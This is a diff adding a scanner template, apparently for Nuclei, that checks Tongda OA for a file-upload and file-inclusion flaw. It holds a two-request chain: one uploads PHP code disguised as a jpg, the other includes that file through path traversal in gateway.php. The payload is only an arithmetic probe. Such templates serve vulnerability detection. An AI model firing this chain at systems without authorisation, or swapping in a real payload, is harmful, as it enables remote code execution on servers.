@@ -1,0 +1,63 @@
+id: tongda-oa-im-upload-php-fileinclude
+
+info:
+  name: 通达OA upload.php 文件包含
+  author: pphua
+  severity: high
+  tags: tongda,oa,fileinclude
+
+http:
+  - raw:
+      - |
+        POST /ispirit/im/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypy123asd
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+        Connection: close
+        
+        ------WebKitFormBoundarypy123asd
+        Content-Disposition: form-data; name="UPLOAD_MODE"
+        
+        2
+        ------WebKitFormBoundarypy123asd
+        Content-Disposition: form-data; name="P"
+        
+        123
+        ------WebKitFormBoundarypy123asd
+        Content-Disposition: form-data; name="DEST_UID"
+        
+        1
+        ------WebKitFormBoundarypy123asd
+        Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
+        Content-Type: image/jpeg
+        
+        <?php echo 255*255;?>
+        ------WebKitFormBoundarypy123asd--
+
+      - |
+        POST /mac/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        json={"url":"/general/../../attach/im/{{replace(path,"_","/")}}.jpg"}
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        internal: true
+        group: 1
+        regex:
+          - '@([0-9]{4}_[0-9]*)\|'
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'65025')"
